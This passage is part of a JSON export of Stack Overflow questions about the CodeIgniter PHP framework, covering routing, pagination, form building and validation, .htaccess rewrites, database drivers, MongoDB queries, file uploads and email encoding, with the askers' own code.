the URLs like \"mysite.com/anything/\" will be routed to the same template but with different content. Until then, everything is okay.</p>\n\n<p>My problem is that I would like to make an exception for that, </p>\n\n<p>because <strong>I want to access my page \"mysite.com/uploads\"</strong> directly into the browser, but I am redirected, due to the routing php stuff.</p>\n\n<p><strong>Is there a way to make an exception to this routing? Like route all names excepted \"upload\" ?</strong></p>\n\n<p>I can submit the routing file, but since it's almost the same than codeigniter maybe you won't need it really.</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter","pyrocms","collaborative-editing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13209079,"title":"collaborative writing script","body":"<p>I asked this question specifically in the codeigniter community with no result, so now I'm widening the search to any php collaborative writing script that I can integrate and extend upon:</p>\n\n<p>I’m looking to create a site with collaborative writing features, meaning that people write on a common story (kinda like fanfiction). I’d like to know if there are any existing CodeIgniter plugins or PyroCMS modules that allow this, that I could add to, instead of building a new module from the ground?</p>\n\n<p>the basic concept is that each contributor writes a small piece of the story, that others can extend upon writing a sequel, a prequel or a replacement middle part, to form multiple narrative paths.</p>\n\n<p>Thank you</p>\n"},{"tags":["php","codeigniter","pagination","limit","offset"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":37,"score":-1,"question_id":13207456,"title":"Codeigniter pagination with filters and performance","body":"<p>i'm having trouble with CI pagination this is my code.</p>\n\n<p>the controller:</p>\n\n<pre><code>$per_page = 20;\n$offset = $this-&gt;uri-&gt;segment(2); \n$results = $this-&gt;model_users-&gt;search($keywords,$limit = $per_page,$offset,$order_by,$expire,$type = $q_type);\n\n$pagination['per_page'] = $per_page;\n$pagination['base_url'] = site_url('users');\n$pagination['first_url'] = site_url('users');\n$pagination['total_rows'] = $this-&gt;db-&gt;count_all_results('ci_users');\n$pagination['uri_segment'] = 2;\n$pagination['first_link'] = 'First';\n$pagination['last_link'] = 'Last';\n$pagination['next_link']  = false;\n$pagination['prev_link']  = false;\n$pagination['num_links'] = 6;\n\n$this-&gt;pagination-&gt;initialize($pagination);\n\n\n$view['users'] = $results;\n</code></pre>\n\n<p>the model:</p>\n\n<pre><code>function search($keywords = false,$limit = false,$offset=false,$order_by = false,$expire = false,$type = 'get'){\n\n if($keywords){\n   $this-&gt;db-&gt;select(\"*,\n           MATCH(\".$type.\") \n           AGAINST ('\".$keywords.\"' IN BOOLEAN MODE)\n            AS _score\",false /*important*/);\n   $this-&gt;db-&gt;having('_score &gt; 0');\n   $this-&gt;db-&gt;from('ci_users');\n  $this-&gt;db-&gt;order_by('_score','DESC');\n}else{\n  $this-&gt;db-&gt;select('*');\n  $this-&gt;db-&gt;from('ci_users');\n}\n  if($expire){\n\n  $this-&gt;db-&gt;order_by('expire_datetime',$expire);\n  }\n  if($order_by){\n  $this-&gt;db-&gt;order_by(\"id\",$order_by);\n }\n\n  if($limit){\n  $this-&gt;db-&gt;limit($limit,$offset);\n}\n\n $query = $this-&gt;db-&gt;get();\n\n  return $query-&gt;result();\n\n}\n</code></pre>\n\n<p>When i click on link1 or link2 everythings is ok, when i click on link3 no results returns and don't understand why.</p>\n\n<p>Using this code it fixes, but it is not good for site performance cause i'm running 2 search queries at same time :</p>\n\n<pre><code> $pagination['total_rows'] = count($this-&gt;model_propos-&gt;search($keywords,false,false,false ,false,$type = $q_type));\n</code></pre>\n\n<p>thanks to who will help me !!</p>\n"},{"tags":["php","codeigniter","activerecord","form-generator"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":42,"score":0,"question_id":13202576,"title":"Building a form dynamically with Codeigniter and Active Record queries","body":"<h3>Model</h3>\n\n<pre><code>    function get_prices() \n    {\n        $table_by_product = 'printer_businesscards'; //replace with URI Segment\n\n        //Get all the columns in the table set by the page URI of $table_by_product variable \n        $get_all_col_names = $this-&gt;db-&gt;list_fields($table_by_product);\n\n        //Loop through the column names. All names starting with 'O_' are optional fields for the \n        //current product. Get all Distinct values and create a radio button list in form.\n        foreach ($get_all_col_names as $key =&gt; $value) {\n            //get all o_types for the product by column name\n            if ($all_O_types = preg_match('/O_/', $value)) \n                {\n                $O_types = array($value);\n                foreach ($O_types as $O) {\n                        //echo $O;\n                        $this-&gt;db-&gt;select($O);\n                        $this-&gt;db-&gt;distinct();\n                        $qO = $this-&gt;db-&gt;get($table_by_product);\n                        $qO_Array = $qO-&gt;result_object();\n                    }\n                } \n            //Get all x_types for the product by column name. All 'X_' types are specific product options.\n            //Create a dropdown menu with all DISTINCT product options.\n            if ($all_X_types = preg_match('/X_/', $value)) \n                {\n                $X_types = array($value);\n                    foreach ($X_types as $X) {\n                        //echo $X;\n                        $this-&gt;db-&gt;select($X);\n                        $this-&gt;db-&gt;distinct();\n                        $qX = $this-&gt;db-&gt;get($table_by_product);\n                        $qX_Array = $qX-&gt;result_object();\n                    }\n                }       \n        }\n        return array($qX_Array,$qO_Array);\n    }\n}\n</code></pre>\n\n<p>So each product has different options but all products options are prefixed by \"X_\" or \"O_\". I need to get the <code>DISTINCT</code> values of each COLUMN of \"X_\" and \"O_\" and in any VIEW I need to build a form with these values. Here is a look at the array:</p>\n\n<pre><code>array (size=3)\n  0 =&gt; \n    object(stdClass)[19]\n      public 'X_SIZE' =&gt; string '1.75x3' (length=6)\n  1 =&gt; \n    object(stdClass)[20]\n      public 'X_SIZE' =&gt; string '1.75x3.5(slim)' (length=14)\n  2 =&gt; \n    object(stdClass)[21]\n      public 'X_SIZE' =&gt; string '2x3' (length=3)\narray (size=3)\n  0 =&gt; \n    object(stdClass)[17]\n      public 'X_PAPER' =&gt; string '14ptGlossCoatedCoverwithUV(C2S)' (length=31)\n  1 =&gt; \n    object(stdClass)[18]\n      public 'X_PAPER' =&gt; string '14ptPremiumUncoatedCover' (length=24)\n  2 =&gt; \n    object(stdClass)[24]\n      public 'X_PAPER' =&gt; string '16ptDullCoverwithMatteFinish' (length=28)\narray (size=2)\n  0 =&gt; \n    object(stdClass)[23]\n      public 'X_COLOR' =&gt; string '1000' (length=4)\n  1 =&gt; \n    object(stdClass)[22]\n      public 'X_COLOR' =&gt; string '1002' (length=4)\narray (size=4)\n  0 =&gt; \n    object(stdClass)[20]\n      public 'X_QTY' =&gt; string '100' (length=3)\n  1 =&gt; \n    object(stdClass)[21]\n      public 'X_QTY' =&gt; string '250' (length=3)\n  2 =&gt; \n    object(stdClass)[17]\n      public 'X_QTY' =&gt; string '500' (length=3)\n  3 =&gt; \n    object(stdClass)[19]\n      public 'X_QTY' =&gt; string '1000' (length=4)\narray (size=3)\n  0 =&gt; \n    object(stdClass)[25]\n      public 'O_RC' =&gt; string 'YES' (length=3)\n  1 =&gt; \n    object(stdClass)[26]\n      public 'O_RC' =&gt; string 'NO' (length=2)\n  2 =&gt; \n    object(stdClass)[27]\n      public 'O_RC' =&gt; string 'NA' (length=2) \n</code></pre>\n\n<p>My current <code>MODEL</code> is only returning <code>X_QTY</code> and <code>O_RC</code> to my view. </p>\n\n<p>What am I doing incorrectly?</p>\n"},{"tags":["php","forms","validation","codeigniter","drop-down-menu"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":227,"score":0,"question_id":10534283,"title":"Avoid validating form's dropdown in codeigniter","body":"<p>I have this search function :</p>\n\n<pre><code>public static function search_form()\n{\n    $form = new Form('search_form');\n\n    $form-&gt;field('keyword', 'text', array\n    (\n        'min_length'    =&gt;  4,\n        'max_length'    =&gt;  15,\n        'alphanumeric'  =&gt;  lang('alphanumeric')\n    )); \n    $form-&gt;field('category', 'select', array\n    (\n        'cat1'  =&gt;  'Category 1',\n        'cat2'  =&gt;  'Category 2',\n        'cat3'  =&gt;  'Category 3'\n\n    ), $value);\n\n    if($data = $form-&gt;validate())\n    {           \n        header('Location: '.WEB.sprintf('search/'.$data['keyword'].'/'.$data['category']));\n    }\n\n    return $form;\n}\n</code></pre>\n\n<p>And the optional validation, that works fine with inputs, but not with dropdowns :</p>\n\n<pre><code>// Validate\npublic function validate()\n{\n    $this-&gt;script();\n\n    if(!$this-&gt;submitted)\n    {\n        return false;\n    }\n\n    $this-&gt;valid = true;\n\n    foreach($this-&gt;fields as $field)\n    {\n        $value = $this-&gt;request[$field[0]];\n\n        if(isset($field[2]['optional']) &amp;&amp; $field[2]['optional'])\n        {\n            if($value == '') continue;\n        }\n\n        foreach($field[2] as $validator=&gt;$data)\n        {\n            if($validator == 'optional') continue;\n\n            $custom = !method_exists($this, $validator);\n\n            if((!$custom &amp;&amp; !$this-&gt;$validator($value, $data)) || ($custom &amp;&amp; !$this-&gt;custom($data, $value)))\n            {\n                $this-&gt;valid = false;\n\n                $this-&gt;errors[$field[0]] = $this-&gt;error_message($field[0], $validator, $data);\n\n                break;\n            }\n        }\n    }\n\n    return $this-&gt;valid?$this-&gt;request:false;\n}\n</code></pre>\n\n<p>When I add the optional parameter in an text input, it works, but not in the select input :</p>\n\n<pre><code>    $form-&gt;field('category', 'select', array\n    (\n        'optional'      =&gt;  true,\n  .................\n</code></pre>\n\n<p>It is transformed as an  value in HTML\nHere is the select case :</p>\n\n<pre><code>        # Input\n        switch($field[1])\n        {\n            case 'text':\n            case 'password':\n                if($this-&gt;submitted)\n                {\n                    echo '&lt;input id=\"'.$this-&gt;id.'_'.$field[0].'\" class=\"text\" type=\"'.$field[1].'\" name=\"'.$field[0].'\" value=\"'.htmlentities(utf8_decode($this-&gt;request[$field[0]]), ENT_QUOTES).'\"/&gt;';\n                } else\n                {\n                    echo '&lt;input id=\"'.$this-&gt;id.'_'.$field[0].'\" class=\"text\" type=\"'.$field[1].'\" name=\"'.$field[0].'\"'.(isset($field[3])?' value=\"'.$field[3].'\"':'').'/&gt;';\n                }\n                break;\n            case 'textarea':\n                echo '&lt;textarea type=\"text\" id=\"'.$this-&gt;id.'_'.$field[0].'\" name=\"'.$field[0].'\"&gt;';\n                echo '&lt;/textarea&gt;';\n                break;\n            case 'select':\n                echo '&lt;select id=\"'.$this-&gt;id.'_'.$field[0].'\" name=\"'.$field[0].'\"&gt;';\n\n                foreach($field[2] as $key=&gt;$value)\n                {\n                    echo '&lt;option value=\"'.$key.'\"';\n\n                    if($this-&gt;submitted &amp;&amp; $this-&gt;request[$field[0]] == $key)\n                    {\n                        echo ' selected=\"selected\"';\n                    } elseif(isset($field[3]) &amp;&amp; $field[3] == $key)\n                    {\n                        echo ' selected=\"selected\"';\n                    }\n\n                    echo '&gt;'.$value.'&lt;/option&gt;';\n                }\n\n                echo '&lt;/select&gt;';\n                break;\n        }\n</code></pre>\n\n<p>The problem is that I need the validator for the first input (keyword) but not for the dropdown, and it seems that I have to validate both fields, which I don't want. Is there a way to bypass the second validation ?</p>\n\n<p>Edit : Actually, I don't know why the dropdown doesn't pass the validation, I just get the \"error_category\" when trying to submit the form.</p>\n\n<p><strong>Problem solved :</strong> </p>\n\n<p>The validating function was actually trying to validate the second field ($field[2]) and looking for the ['optional'] value, but couldn't find it, as my second field was in fact the categories array.\nTo solve the problem, I just added a new array in second position, containing the \"optional = true\" and moved my actual array in third position.\nThe validation was then okay, but the option values didn't showed up so I just had to change : </p>\n\n<pre><code>   foreach($field[2] as $key=&gt;$value)\n            {\n                echo '&lt;option value=\"'.$key.'\"'; ...\n</code></pre>\n\n<p>and replace $field[2] by $field[3]\nThen just move the value field (previously $field[3]) to $field[4]</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13189873,"title":"What does $this->load->model('foo_model'); actually do In codeigniter?","body":"<p>Does the controller extends the foo_model or just we are loading the whole model itself?</p>\n\n<p>If it is loading how can i create a proper object for model(foo_model) class..</p>\n\n<p>coz i used something like <code>$obj = new foo_model();</code> </p>\n\n<p>my model class looks like this:</p>\n\n<pre><code>class foo_model extends CI_model{\npublic $model_variable;\n\nfunction foo_model(){\n    parent::__construct();\n\n    $this-&gt;$model_variable = $this-&gt;db-&gt;query('mysql query returning array of values')-&gt;result();\n\n}\n</code></pre>\n\n<p>}</p>\n\n<p>And my controller is like this </p>\n\n<pre><code>class foo1_controller extends CI_controller{\n\npublic function foo1_controller()\n{\n    //loading basic libraries and helper fn.\n}\n\npublic function some_controllerfn()\n{\n    $this-&gt;load-&gt;model('foo_model');\n    $foo_details = new foo_model();\n    //print $foo_details as objects\n}\n</code></pre>\n\n<p>}</p>\n\n<p>the problems i face here is \nthe model is called twice when i use the controller function \nand i also want $foo_details to be returned as objects.\nwhat will be the proper way to do this ,any help would be appreciated . Thanks in advance.</p>\n"},{"tags":["php","arrays","codeigniter","foreach","mysqli"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":13204938,"title":"How to work with a multidimensional array?","body":"<p>Here is a var_dump or an array returned from my MODEL:</p>\n\n<pre><code>array (size=5)\n  0 =&gt; \n    array (size=3)\n      0 =&gt; \n        object(stdClass)[19]\n          public 'X_SIZE' =&gt; string '1.75x3' (length=6)\n      1 =&gt; \n        object(stdClass)[20]\n          public 'X_SIZE' =&gt; string '1.75x3.5(slim)' (length=14)\n      2 =&gt; \n        object(stdClass)[21]\n          public 'X_SIZE' =&gt; string '2x3' (length=3)\n  1 =&gt; \n    array (size=3)\n      0 =&gt; \n        object(stdClass)[17]\n          public 'X_PAPER' =&gt; string '14ptGlossCoatedCoverwithUV(C2S)' (length=31)\n      1 =&gt; \n        object(stdClass)[18]\n          public 'X_PAPER' =&gt; string '14ptPremiumUncoatedCover' (length=24)\n      2 =&gt; \n        object(stdClass)[24]\n          public 'X_PAPER' =&gt; string '16ptDullCoverwithMatteFinish' (length=28)\n  2 =&gt; \n    array (size=2)\n      0 =&gt; \n        object(stdClass)[23]\n          public 'X_COLOR' =&gt; string '1000' (length=4)\n      1 =&gt; \n        object(stdClass)[22]\n          public 'X_COLOR' =&gt; string '1002' (length=4)\n  3 =&gt; \n    array (size=4)\n      0 =&gt; \n        object(stdClass)[26]\n          public 'X_QTY' =&gt; string '100' (length=3)\n      1 =&gt; \n        object(stdClass)[25]\n          public 'X_QTY' =&gt; string '250' (length=3)\n      2 =&gt; \n        object(stdClass)[29]\n          public 'X_QTY' =&gt; string '500' (length=3)\n      3 =&gt; \n        object(stdClass)[30]\n          public 'X_QTY' =&gt; string '1000' (length=4)\n  4 =&gt; \n    array (size=3)\n      0 =&gt; \n        object(stdClass)[28]\n          public 'O_RC' =&gt; string 'YES' (length=3)\n      1 =&gt; \n        object(stdClass)[27]\n          public 'O_RC' =&gt; string 'NO' (length=2)\n      2 =&gt; \n        object(stdClass)[33]\n          public 'O_RC' =&gt; string 'NA' (length=2)\n</code></pre>\n\n<p>My controller is sending to my view and on my view the above dump is of: <code>var_dump($printerOptions)</code></p>\n\n<p>Ok so I need to create a dropdown menu for each of these arrays and radio buttons for the <code>O_RC</code> array.</p>\n\n<p>I am using codeigniter and using <code>form_dropdown('',$val);</code> inside of a foreach loop causes multiple dropdowns for each key and element in the array.</p>\n\n<pre><code>foreach ($printerOptions as $Options) \n{\n//var_dump($Options);\n    foreach ($Options as $Specs) \n    {\n        echo $Specs-&gt;X_SIZE;\n        echo $Specs-&gt;X_PAPER;\n        echo $Specs-&gt;X_COLOR;\n        echo $Specs-&gt;X_QTY;\n        echo $Specs-&gt;O_RC;\n    }\n}\n</code></pre>\n\n<p>This ^ code will echo out the expected values of the corresponding arrays but for some reason I get LOOPING errors with the output:</p>\n\n<pre><code>Undefined property: stdClass::$X_PAPER\nUndefined property: stdClass::$X_COLOR\nUndefined property: stdClass::$X_QTY\nUndefined property: stdClass::$O_RC\n</code></pre>\n\n<p>Looking at my array how can I create a dropdown menu for each of the arrays respectively?</p>\n\n<p>Thanks for the help.</p>\n\n<h1>MODEL /// Update ///</h1>\n\n<pre><code>class M_Pricing extends CI_Model {\n\n    function get_prices() \n    {\n        $table_by_product = 'printer_businesscards'; //replace with URI Segment\n\n        //Get all the columns in the table set by the page URI of $table_by_product variable \n        $get_all_col_names = $this-&gt;db-&gt;list_fields($table_by_product);\n\n        //Loop through the column names. All names starting with 'O_' are optional fields for the \n        //current product. Get all Distinct values and create a radio button list in form.\n        $resultArray = array();\n\n        foreach ($get_all_col_names as $key =&gt; $value) {\n            //get all o_types for the product by column name\n            if (preg_match('/O_/', $value)) \n                {\n                $v = (array('Specs' =&gt; $value));\n                foreach ($v as $vals) {\n                    $this-&gt;db-&gt;select($vals);\n                    $this-&gt;db-&gt;distinct();\n                    $qX = $this-&gt;db-&gt;get($table_by_product);\n                    $resultArray[] = $qX-&gt;result();\n                    }\n                } \n\n            //Get all x_types for the product by column name. All 'X_' types are specific product options.\n            //Create a dropdown menu with all DISTINCT product options. \n            if (preg_match('/X_/', $value)) \n                {\n                $v = (array('Type' =&gt; $value));\n                foreach ($v as $vals) {\n                    $this-&gt;db-&gt;select($vals);\n                    $this-&gt;db-&gt;distinct();\n                    $qX = $this-&gt;db-&gt;get($table_by_product);\n                    $resultArray[] = $qX-&gt;result();\n                    }\n                }       \n        }\n        //return $resultArray\n        //var_dump($resultArray); die;\n        return $resultArray;\n    }\n</code></pre>\n"},{"tags":[".htaccess","codeigniter","web-hosting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":378,"score":0,"question_id":4600662,"title":"codeigniter problem login through IE, Safari, Chrome?","body":"<p>everything works fine in localhost but i have a problem login from other browsers like safari and chrome, in firefox its ok. may be it is because of htaccess or may be other. i tried a lot searching but come to no solution. my htaccess file look like this.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>my server folder hirarchy looks like this</p>\n\n<pre><code>public_html\nL application\n  system\n  css\n  images\n  .htaccess\n</code></pre>\n\n<p>application/config/config.php looks like this</p>\n\n<pre><code>$config['index_page'] = \"index.php?\";\n$config['uri_protocol'] = 'QUERY_STRING';\n</code></pre>\n\n<p>i have used hmvc too.\nany help?</p>\n"},{"tags":["php","javascript","html","ajax","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":13205119,"title":"autocomplete value in textbox codeigniter","body":"<p>I have done to make control autocomplete, but I have a problem to post data with jquery.</p>\n\n<pre><code>&lt;input type=\"text\" id=\"matakuliah\" class=\"med\" name=\"matakuliah\"&gt;\n&lt;script type=\"text/javascript\"&gt;\n        $(this).ready( function() {\n            $(\"#matakuliah\").autocomplete({\n                minLength: 1,\n\n                source:\n                function(req, add){\n                    $.ajax({\n                        url: \"&lt;?php echo site_url('bahanAjar/lookup'); ?&gt;\",\n                        dataType: 'json',\n                        type: 'POST',\n                        data:req,\n                        success:   \n                        function(data){\n                            if(data.response ==\"true\"){\n                                add(data.message);\n                            }\n                        },\n                    });\n                },\n\n\n            });\n        });\n&lt;/script&gt;\n</code></pre>\n\n<p>on my controller</p>\n\n<pre><code>function lookup(){\n        // process posted form data (the requested items like province)\n        $keyword = $this-&gt;input-&gt;post('term');\n\n        $data['response'] = 'false'; //Set default response\n        $query = $this-&gt;matakuliah_model-&gt;lookup($keyword); //Search DB\n        if( ! empty($query) )\n        {\n            $data['response'] = 'true'; //Set response\n            $data['message'] = array(); //Create array\n            foreach( $query as $row )\n            {\n                $data['message'][] = array(\n                                        'id_matakuliah'=&gt;$row-&gt;id,\n                                        'value' =&gt; $row-&gt;matakuliah,\n                                        ''\n                                     );  //Add a row to array\n            }\n        }\n        if('IS_AJAX')\n        {\n            echo json_encode($data); //echo json string if ajax request\n\n        }\n        else\n        {\n           $this-&gt;load-&gt;view('admin/bahan_ajar/form_manage_file_view', $data); //Load html view of search results\n        }\n    }\n</code></pre>\n\n<p>The code work it well, but I want to add parameter to call database.</p>\n\n<pre><code> $query = $this-&gt;matakuliah_model-&gt;lookup($keyword, $id_matakuliah);\n</code></pre>\n\n<p>like this. how I can get </p>\n\n<pre><code>$this-&gt;input-&lt;post('id_matakuliah') \n</code></pre>\n\n<p>from jquery before.;</p>\n\n<p>and I have another textbox for fill value of autocomplete from textbox matakuliah.</p>\n\n<pre><code>`&lt;input type=\"hidden\" id=\"matakuliah_post\" class=\"med\" name=\"matakuliah_post\"&gt;`\n</code></pre>\n\n<p>When I'm use autocomplete textbox automatic fill another textbox, please help me.</p>\n"},{"tags":["php","sql","codeigniter","iis-7.5","php-5.4"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13203917,"title":"Unable to connect using sqlsrv on PHP 5.4 but works for 5.3","body":"<p>After upgrading to PHP 5.4 and using CodeIgniter's PHP framework my application refused to connect to the SQL Server 2005 database. There were no configuration changes performed, and I made sure to install the PHP SQLSRV drivers (3.0.3) as well. The specific message from CI was \"Unable to connect to your database server using the provided settings\".</p>\n\n<p>Switch back to PHP 5.3 and everything works.</p>\n\n<p>To make sure that the sqlsrv drivers are installed on PHP 5.4 I ran <code>php -m</code> and it displays \"sqlsrv\". phpinfo() looks good as well.</p>\n\n<p>I can't get any debug information on how/why sqlsrv isn't connecting with the new drivers. What's funny is that if I download sqlsrv-5.4-nts-snap.zip from <a href=\"http://downloads.php.net/pierre/\" rel=\"nofollow\">this funny page of drivers on MS's site</a> - then it works! However it seems to be using sqlsrv 2.0 drivers.</p>\n\n<p>Does SQLSRV work on PHP 5.4?</p>\n"},{"tags":["php","php5","codeigniter","orm"],"answer_count":4,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":338,"score":5,"question_id":6762464,"title":"codeigniter's DB class as standalone?","body":"<p>Looking for something similar to Codeigniter's DB class that would be standalone.</p>\n\n<p>I've tried Doctrine which turned out to be quite heavy (also - schema is generated from your class which wasn't something I liked).</p>\n"},{"tags":["php","codeigniter","mongodb"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13203555,"title":"How do I query a MongoDB collection?","body":"<pre><code>[_id] =&gt; MongoId Object (\n    [$id] =&gt; 5090ace3788a466769b3804e\n)\n[startdate] =&gt; MongoDate Object (\n    [sec] =&gt; 1301616000\n    [usec] =&gt; 0\n)\n[enddate] =&gt; MongoDate Object (\n    [sec] =&gt; 1304121600\n    [usec] =&gt; 0\n)\n[your_id] =&gt; 33902\n[odd_blah] =&gt; blahblah\n[cam_id] =&gt; 339\n[cost] =&gt; 0.01\n[iscurrent] =&gt; \n[damn_current] =&gt; Array (\n)\n\n$coll = $this-&gt;mongo_db-&gt;where('cam_id', 339)-&gt;get('collection_name);\n</code></pre>\n\n<p>This returns nothing. As you might notice I am using\n<a href=\"https://github.com/alexbilbie/codeigniter-mongodb-library/tree/v2\" rel=\"nofollow\">https://github.com/alexbilbie/codeigniter-mongodb-library/tree/v2</a></p>\n\n<p>I get an empty array. Can anyone help? This sounds primitive, but kind of stuck here.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13183620,"title":"codeigniter after submission if refresh submit again","body":"<p>This is simple I guess but I am new to codeigniter, so please help. I have a form page that takes data and when submitted stores that data in database. I then tried two ways to redirect back to main page:</p>\n\n<pre><code>first: $this-&gt;load-&gt;view('home');\n\nsecond: redirect('/login/form/', 'refresh');\n</code></pre>\n\n<p>They successfully redirect or load the home page, but url is still /property/new_property which is the view for data input. also when I click refresh on the home page with url as stated above, data is resubmitted so multiple records in database. How can I redirect to home and make the url property/home?</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter","file-upload"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13197811,"title":"deleting and replacing image file but still showing old image","body":"<p>Hey guys was hoping you could help me out.</p>\n\n<p>I am having the weirdest problem. I have a script which is used to delete/update image files, which are displayed. </p>\n\n<p>The problem is, they are being deleted, and replaced (when I check in the particular directory), BUT the image being shown at that particular url is still the old one.</p>\n\n<p>I.e I after deleting the old file (1.jpg, which was gray), this is what the directory looks like:</p>\n\n<p><img src=\"http://i.stack.imgur.com/SsPHg.jpg\" alt=\"enter image description here\"></p>\n\n<p>BUT, the url is still showing 1.jpg as the old gray img, i.e\n<img src=\"http://i.stack.imgur.com/3Egnu.jpg\" alt=\"enter image description here\"></p>\n\n<p>Now, you might think that I am looking up a wrong url and adding/edeting another file, but just to confirm, I added a foo.html file in the same directory to and replaced 1.jpg with foo.html to confirm that I was in the correct directory, and I was.</p>\n\n<p>My script for editing replacing the file is this:</p>\n\n<pre><code>if(!empty($_FILES[\"pic\".$ite][\"name\"])){\n        if($id){\n            unlink($path.\"$ite.jpg\");\n\n        }\n        $ext = pathinfo($_FILES['pic'.$ite]['name'], PATHINFO_EXTENSION);\n        $config[\"file_name\"]=\"$ite.jpg\";\n        $this-&gt;transfer.=\"$ite.$ext\";\n        $this-&gt;upload-&gt;initialize($config);\n\n\n        if(!$this-&gt;upload-&gt;do_upload(\"pic\".$ite)){\n            $this-&gt;transfer.=lang('msg_errorimage').' '.$ite;\n        }\n        }\n</code></pre>\n\n<hr>\n\n<p>I just renamed the folder from \"3\" to \"3a\", then opened the link to the image and got a 404 error, then changed the name of the folder back to \"3\" from \"3a\" and now the correct image is showing.</p>\n"},{"tags":["apache",".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13198068,"title":"How can I remove \"index.php\" from my links?","body":"<p>Normally I access a page like this: <code>http://localhost/codeigniter/index.php/auth/login</code>\nHowever I want to be able to access to the page like this : <code>http://localhost/codeigniter/auth/login</code></p>\n\n<p>I have no information about <code>http.conf</code> and <code>.htaccess</code> configurations.</p>\n\n<p>I have set <code>$config['index_page'] = '';</code> in <code>codeigniter/application/config/config.php</code></p>\n\n<p>my http.conf file is at its default except uncommentnig \"<code>LoadModule rewrite_module modules/mod_rewrite.so</code>\"</p>\n\n<p>I inspected many proposed .htaccess files but I could not understand the logic behind the rewriting rules.</p>\n\n<p>Here is the most successful <code>.htaccess</code> content for me. It is located at <code>/www/CodeIgniter/</code> .<br>\n(by the most successful I mean that this is the only one that gives 404 error created by the CodeIgniter not by the server.)</p>\n\n<pre><code>    RewriteOptions Inherit\nOptions -Indexes\nOptions +FollowSymLinks\nRewriteBase /CodeIgniter/\n# Set the default file for indexes\nDirectoryIndex index.php\n\n&lt;IfModule mod_rewrite.c&gt;\n\n    # activate URL rewriting\n    RewriteEngine on\n\n    # do not rewrite links to the documentation, assets and public files\n    RewriteCond $1 !^(images|assets|uploads|captcha)\n\n    # do not rewrite for php files in the document root, robots.txt or the maintenance page\n    RewriteCond $1 !^([^\\..]+\\.php|robots\\.txt)\n\n    # but rewrite everything else\n    RewriteRule ^(.*)$ index.php/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n\n    ErrorDocument 404 index.php\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I hate requesting direct solutions however unfortunately, it is my last resort :/\nCan you give me a right solution to my problem?</p>\n"},{"tags":["codeigniter","insert"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13198914,"title":"Call to a member function insert() on a non-object, codeigniter","body":"<p>I am trying to insert data to mysql in codeigniter. Controller class :</p>\n\n<pre><code>class Ci_insert extends CI_Controller\n    {\n        function __construct()\n        {\n            parent::__construct();\n        }\n\n        function index()\n        {\n            $data = array(\n                          \"USN\" =&gt; \"TRE5rCS89G\",\n                          \"name\" =&gt; \"NITISH DOLAKASHARIA\",\n                          \"branch\" =&gt; \"CS\"\n                          );\n\n            $this-&gt;load-&gt;model('ci_insert_model');\n\n            $this-&gt;ci_insert_model-&gt;addToDb($data);\n        }\n\n    }\n</code></pre>\n\n<p>Model Class :</p>\n\n<pre><code>class ci_insert_model extends CI_Model\n    {\n        function __construct()\n        {\n            parent::__construct();\n        }\n        function addToDb($data)\n        {\n\n            //var_dump($data);\n            $this-&gt;db-&gt;insert('class_record',$data);\n        }\n    }\n</code></pre>\n\n<p>But when I tried to run the code, it shows <code>Fatal error: Call to a member function insert() on a non-object in C:\\wamp\\www\\CodeIgniter\\application\\models\\ci_insert_model.php on line 12</code>.</p>\n\n<p>Whats wrong with the code above?</p>\n"},{"tags":["php","codeigniter","sendmail"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":380,"score":1,"question_id":7804198,"title":"How to send an email in base64 encode in CodeIgniter?","body":"<p>I am facing the issue the odd exclamation symbol in email. For that I tested in seperate mail funation with base64 encode. Thats working fine. I set the header like this.</p>\n\n<pre><code>$headers = \"MIME-Version: 1.0\" . \"\\r\\n\";\n$headers .= \"Content-type:text/html;charset=iso-8859-1\" . \"\\r\\n\";\n$headers .= \"Content-Transfer-Encoding:base64\" . \"\\r\\n\"; \n// More headers\n$headers .= 'From:'.$from. \"\\r\\n\";\n$htmlcode = rtrim(chunk_split(base64_encode($msg))); \n$ret=mail($to,$subj,$htmlcode,$headers);\n</code></pre>\n\n<p>Now I want to set the same header option in 